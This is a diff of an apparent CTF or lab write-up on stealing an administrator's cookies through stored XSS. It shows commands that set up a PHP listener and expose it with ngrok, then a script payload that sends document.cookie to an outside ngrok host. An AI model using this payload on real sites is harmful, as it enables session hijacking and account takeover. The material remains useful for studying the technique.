@@ -26,26 +26,15 @@ We have to delivery all collected cookie from victim (administrator) to a specif
 
 Let's take action step-by-step:
 
-1. Create a server, I use **PHP** in my case. Create a PHP file without specific content:
+1. Run PHP server with **localhost** and optional **port** without any content: `php -S localhost:4444 `
 
-```PHP
-<html>
-    <body>
-    <?php 
-       
-    ?>
-    </body>
-</html>
-```
-2. Run PHP server with **localhost** and optional **port** : `php -S localhost:4444 hacking.php`
-
-3. Public our server by tunneling. I use **ngrok** to server this purpose:
+2. Public our server by tunneling. I use **ngrok** to server this purpose:
    - Connect to ngrok with your account token: `ngrok authtoken {your_account_token}`
    - Tunneling our local site to public network with port specified above: `ngrok http 4444`
    - Get the public link we get from ngrok and create with payload above.
    <p align="center"><img src="https://user-images.githubusercontent.com/48288606/158958343-5d03bfd3-686b-437b-8d3d-97bda34cedc1.png" /></p>
 
-4. Send our payload: `hacking` in **title** and 
+3. Send our payload: `hacking` in **title** and 
 ```javascript
 <script> document.write("<img src='http://85ae-123-21-33-87.ngrok.io?cookie=" + document.cookie + "' />") </script>
 ``` 
